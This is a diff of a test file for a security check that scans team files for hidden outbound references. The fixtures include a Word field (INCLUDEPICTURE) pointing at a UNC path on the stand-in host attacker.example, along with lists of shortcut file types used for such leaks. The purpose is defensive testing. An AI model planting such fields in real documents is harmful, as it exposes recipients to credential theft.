@@ -16,7 +16,7 @@ import { boxShellTool, callerOf } from '../../server/src/devenv/tool'
 import { settleRunWrites } from '../../server/src/devenv/track'
 import { componentC } from '../../server/src/team-files/component'
 import { officeExitRequest } from '../../server/src/files/office-links-check'
-import { assertSafeTeamFile, contentKind, officeKind } from '../../server/src/files/office-exit'
+import { assertSafeTeamFile, bytesReader, contentKind, officeKind } from '../../server/src/files/office-exit'
 import { writeZip } from '../../server/src/files/zip-write'
 import { docx, UNC } from '../lib/office-fixture'
 
@@ -64,7 +64,7 @@ describe('the exit check', () => {
     await expect(assertSafeTeamFile('a.mht', enc.encode('MIME-Version: 1.0\r\nContent-Type: multipart/related; boundary=x\r\n'), null)).rejects.toThrow(/MHT/)
     for (const n of ['a.url', 'b.library-ms', 'c.searchConnector-ms', 'd.scf']) await expect(assertSafeTeamFile(n, enc.encode('x'), null)).rejects.toThrow(/outside the team folder/)
     await expect(assertSafeTeamFile('ok.txt', enc.encode('[InternetShortcut]\r\nURL=file://h/s\r\n'), null)).rejects.toThrow(/shortcut/)
-    expect(contentKind('a.txt', enc.encode('hello'))).toBeNull()
+    expect(contentKind('a.txt', 5, bytesReader(enc.encode('hello')))).toBeNull()
   })
 })
 
@@ -82,6 +82,38 @@ function word(body: string, rels = ''): Uint8Array {
 }
 const fld = (code: string) => `<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve">${code}</w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>`
 const ole = (id: string, t = 'embeddings/oleObject1.bin') => `<Relationship Id="${id}" Type="${OD}/oleObject" Target="${t}"/>`
+describe('the second review\'s repros: what a package is comes from its parts, read in full', () => {
+  const body = `<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body>${'<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve">INCLUDEPICTURE "\\\\\\\\attacker.example\\\\x\\\\a.png" \\d</w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'}</w:body></w:document>`
+  test('E: a Word main part outside word/ is still scanned for its fields', async () => {
+    const d = writeZip([
+      { name: '[Content_Types].xml', data: enc.encode(CT) },
+      { name: '_rels/.rels', data: enc.encode(`<Relationships xmlns="${RELS}"><Relationship Id="rId1" Type="${OD}/officeDocument" Target="a/main.xml"/></Relationships>`) },
+      { name: 'a/main.xml', data: enc.encode(body) },
+    ])
+    expect(contentKind('r.docx', d.length, bytesReader(d))).toMatchObject({ office: expect.any(String) })
+    expect(() => officeExitRequest(frame('pptx', d))).toThrow(/INCLUDEPICTURE/i)
+    await expect(assertSafeTeamFile('r.docx', d, null)).rejects.toThrow(/INCLUDEPICTURE/i)
+  })
+  test('F: a directory larger than any tail, and bytes before the zip, still list every part', async () => {
+    const pad = Array.from({ length: 50000 }, (_, i) => ({ name: `customXml/p${String(i).padStart(6, '0')}${'x'.repeat(60)}.bin`, data: new Uint8Array(0) }))
+    const d = writeZip([
+      { name: '[Content_Types].xml', data: enc.encode(CT) },
+      { name: '_rels/.rels', data: enc.encode(`<Relationships xmlns="${RELS}"><Relationship Id="rId1" Type="${OD}/officeDocument" Target="word/document.xml"/></Relationships>`) },
+      { name: 'word/document.xml', data: enc.encode(body) },
+      ...pad,
+    ])
+    expect(contentKind('r.docx', d.length, bytesReader(d))).toMatchObject({ office: 'docx' })
+    await expect(assertSafeTeamFile('r.bin', d, null)).rejects.toThrow()
+    // junk before the zip: still a zip, still checked
+    const junk = new Uint8Array([...enc.encode('#!junk before the zip\n'), ...docx({ link: UNC })])
+    expect(contentKind('r.dat', junk.length, bytesReader(junk))).toMatchObject({ office: 'docx' })
+    // a zip whose directory cannot be read in full is refused, never passed
+    const broken = docx({ link: UNC }).slice(); const dv = new DataView(broken.buffer); const eocd = broken.length - 22; dv.setUint16(eocd + 10, 9, true); dv.setUint16(eocd + 8, 9, true)
+    expect(contentKind('r.docx', broken.length, bytesReader(broken))).toMatchObject({ opaque: expect.stringMatching(/could not be listed/) })
+    await expect(assertSafeTeamFile('r.docx', broken, null)).rejects.toThrow(/could not be listed/)
+  })
+})
+
 describe('items are vouched for one by one, by exactly what they are', () => {
   test('A: one intranet INCLUDEPICTURE in the template does not vouch for a new one', () => {
     const orig = word(fld('INCLUDEPICTURE "\\\\\\\\intranet\\\\logo.png" \\d'))
@@ -113,9 +145,9 @@ describe('items are vouched for one by one, by exactly what they are', () => {
     expect(() => officeExitRequest(frame('docx', v))).toThrow(/attacker\.example|file:/)
   })
   test('D: what a file is comes from its content, not its name', () => {
-    expect(contentKind('a.doc', new Uint8Array([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]))).toMatchObject({ opaque: expect.any(String) })
-    expect(contentKind('a.txt', docx())).toEqual({ office: 'docx' })
-    for (const n of ['a.url', 'a.library-ms']) expect(contentKind(n, enc.encode('x'))).toMatchObject({ shortcut: expect.any(String) })
+    expect(contentKind('a.doc', 8, bytesReader(new Uint8Array([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1])))).toMatchObject({ opaque: expect.any(String) })
+    const d = docx(); expect(contentKind('a.txt', d.length, bytesReader(d))).toMatchObject({ office: 'docx' })
+    for (const n of ['a.url', 'a.library-ms']) expect(contentKind(n, 1, bytesReader(enc.encode('x')))).toMatchObject({ shortcut: expect.any(String) })
   })
 })
 
